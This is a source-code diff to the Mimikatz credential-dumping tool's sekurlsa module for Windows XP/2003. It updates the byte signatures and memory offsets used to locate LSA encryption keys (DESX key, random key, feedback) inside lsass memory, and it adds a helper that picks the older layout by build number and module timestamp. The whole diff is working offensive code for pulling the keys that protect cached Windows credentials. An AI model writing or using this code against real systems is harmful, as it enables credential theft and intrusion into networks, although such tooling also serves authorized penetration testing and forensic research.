@@ -12,17 +12,14 @@ LONG OFFS_WNT5_g_pRandomKey								= -17;
 LONG OFFS_WNT5_g_pDESXKey								= -35;
 LONG OFFS_WNT5_g_cbRandomKey							= -24;
 #elif defined _M_IX86
-BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]		= {0x84, 0xc0, 0x74, 0x44, 0x6a, 0x08, 0x68};
-LONG OFFS_WNT5_g_Feedback								= sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
-LONG OFFS_WNT5_g_pRandomKey								= sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY) + 15;
-LONG OFFS_WNT5_g_pDESXKey								= sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY) + 21;
-LONG OFFS_WNT5_g_cbRandomKey							= sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY) + 32;
+BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]		= {0x05, 0x90, 0x00, 0x00, 0x00, 0x6a, 0x18, 0x50, 0xa3};
+LONG OFFS_WNT5_g_Feedback								= 25;
+LONG OFFS_WNT5_g_pRandomKey								= 9;
+LONG OFFS_WNT5_g_pDESXKey								= -4;
+LONG OFFS_WNT5_g_cbRandomKey							= 57;
 
-BYTE PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY[]	= {0x84, 0xc0, 0x0f, 0x84, 0xe5, 0xe8, 0x00, 0x00, 0x6a, 0x08, 0x68};
-LONG OFFS_WNT5_old_g_Feedback							= sizeof(PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY);
-LONG OFFS_WNT5_old_g_pRandomKey							= sizeof(PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY) + 19;
-LONG OFFS_WNT5_old_g_pDESXKey							= sizeof(PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY) + 25;
-LONG OFFS_WNT5_old_g_cbRandomKey						= sizeof(PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY) + 36;
+LONG OFFS_WNT5_old_g_Feedback							= 29;
+LONG OFFS_WNT5_old_g_cbRandomKey						= 65;
 #endif
 
 HMODULE kuhl_m_sekurlsa_nt5_hLsasrv = NULL;
@@ -54,7 +51,7 @@ NTSTATUS kuhl_m_sekurlsa_nt5_init()
 				sMemory.kull_m_memoryRange.kull_m_memoryAdress = vbInfos.DllBase;
 				sMemory.kull_m_memoryRange.size = vbInfos.SizeOfImage;
 				#ifdef _M_IX86
-				isOld = (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_BUILD_2K3) && (vbInfos.TimeDateStamp < KUHL_M_SEKURLSA_NT5_SP2_MIN_TIMESTAMP);
+					isOld = kuhl_m_sekurlsa_nt5_isOld(MIMIKATZ_NT_BUILD_NUMBER, vbInfos.TimeDateStamp);
 				#endif
 
 				if(!kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory)
@@ -74,15 +71,7 @@ NTSTATUS kuhl_m_sekurlsa_nt5_init()
 
 				if(kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory)
 				{
-						aMemory.address = PTRN_WNT5_LsaInitializeProtectedMemory_KEY;
-					#ifdef _M_IX86
-						if(isOld)
-						{
-							aMemory.address = PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY;
-							sizeOfSearch = sizeof(PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY);
-						}
-					#endif
-					
+					aMemory.address = PTRN_WNT5_LsaInitializeProtectedMemory_KEY;
 					if(kull_m_memory_search(&aMemory, sizeOfSearch, &sMemory, FALSE))
 					{
 					#ifdef _M_X64
@@ -92,8 +81,8 @@ NTSTATUS kuhl_m_sekurlsa_nt5_init()
 							g_cbRandomKey	= (PDWORD )(((PBYTE) sMemory.result + OFFS_WNT5_g_cbRandomKey)	+ sizeof(LONG) + *(LONG *)((PBYTE) sMemory.result + OFFS_WNT5_g_cbRandomKey));
 					#elif defined _M_IX86
 							g_Feedback		= *(PBYTE  *)((PBYTE) sMemory.result + (isOld ? OFFS_WNT5_old_g_Feedback	: OFFS_WNT5_g_Feedback));
-							g_pRandomKey	= *(PBYTE **)((PBYTE) sMemory.result + (isOld ? OFFS_WNT5_old_g_pRandomKey	: OFFS_WNT5_g_pRandomKey));
-							g_pDESXKey		= *(PBYTE **)((PBYTE) sMemory.result + (isOld ? OFFS_WNT5_old_g_pDESXKey	: OFFS_WNT5_g_pDESXKey));
+							g_pRandomKey	= *(PBYTE **)((PBYTE) sMemory.result + OFFS_WNT5_g_pRandomKey);
+							g_pDESXKey		= *(PBYTE **)((PBYTE) sMemory.result + OFFS_WNT5_g_pDESXKey);
 							g_cbRandomKey	= *(PDWORD *)((PBYTE) sMemory.result + (isOld ? OFFS_WNT5_old_g_cbRandomKey	: OFFS_WNT5_g_cbRandomKey));
 					#endif
 						if(g_Feedback && g_pRandomKey && g_pDESXKey && g_cbRandomKey)
@@ -125,24 +114,31 @@ NTSTATUS kuhl_m_sekurlsa_nt5_clean()
 	return STATUS_SUCCESS;
 }
 
+BOOL kuhl_m_sekurlsa_nt5_isOld(DWORD osBuildNumber, DWORD moduleTimeStamp)
+{
+	BOOL status = FALSE;
+	if(osBuildNumber == KULL_M_WIN_BUILD_2K3)
+	{
+		if(moduleTimeStamp == 0x49901640) // up to date SP1 3290 - Mon Feb 09 12:40:48 2009 (WTF, a build number <, but timestamp >)
+			status = TRUE;
+		else if(moduleTimeStamp <= 0x45d70a62) // first SP2 3959 - Sat Feb 17 15:00:02 2007
+			status = TRUE;
+	}
+	return status;
+}
+
 NTSTATUS kuhl_m_sekurlsa_nt5_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule)
 {
 	NTSTATUS status = STATUS_NOT_FOUND;
 	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {PTRN_WNT5_LsaInitializeProtectedMemory_KEY, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	KULL_M_MEMORY_SEARCH sMemory = {{{lsassLsaSrvModule->DllBase.address, cLsass->hLsassMem}, lsassLsaSrvModule->SizeOfImage}, NULL};
 	DWORD sizeOfSearch = sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
-	LONG offFeedBack = OFFS_WNT5_g_Feedback, offpDESXKey = OFFS_WNT5_g_pDESXKey, offpRandomKey = OFFS_WNT5_g_pRandomKey;
+	LONG offFeedBack = OFFS_WNT5_g_Feedback;
 #ifdef _M_X64
 	LONG offset64;
 #elif defined _M_IX86
-	if((cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_2K3) && (lsassLsaSrvModule->TimeDateStamp < KUHL_M_SEKURLSA_NT5_SP2_MIN_TIMESTAMP))
-	{
-		aLocalMemory.address = PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY;
-		sizeOfSearch = sizeof(PTRN_WNT5_old_LsaInitializeProtectedMemory_KEY);
+	if(kuhl_m_sekurlsa_nt5_isOld(cLsass->osContext.BuildNumber, lsassLsaSrvModule->TimeDateStamp))
 		offFeedBack = OFFS_WNT5_old_g_Feedback;
-		offpDESXKey = OFFS_WNT5_old_g_pDESXKey;
-		offpRandomKey = OFFS_WNT5_old_g_pRandomKey;
-	}
 #endif
 	
 	if(kull_m_memory_search(&aLocalMemory, sizeOfSearch, &sMemory, FALSE))
@@ -161,10 +157,10 @@ NTSTATUS kuhl_m_sekurlsa_nt5_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 			aLocalMemory.address = g_Feedback;
 			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, 8))
 			{
-				aLsassMemory.address = (PBYTE) sMemory.result + offpDESXKey;
+				aLsassMemory.address = (PBYTE) sMemory.result + OFFS_WNT5_g_pDESXKey;
 				if(kuhl_m_sekurlsa_nt5_acquireKey(&aLsassMemory, *g_pDESXKey, 144))
 				{
-					aLsassMemory.address = (PBYTE) sMemory.result + offpRandomKey;
+					aLsassMemory.address = (PBYTE) sMemory.result + OFFS_WNT5_g_pRandomKey;
 					if(kuhl_m_sekurlsa_nt5_acquireKey(&aLsassMemory, *g_pRandomKey, 256))
 						status = STATUS_SUCCESS;
 				}
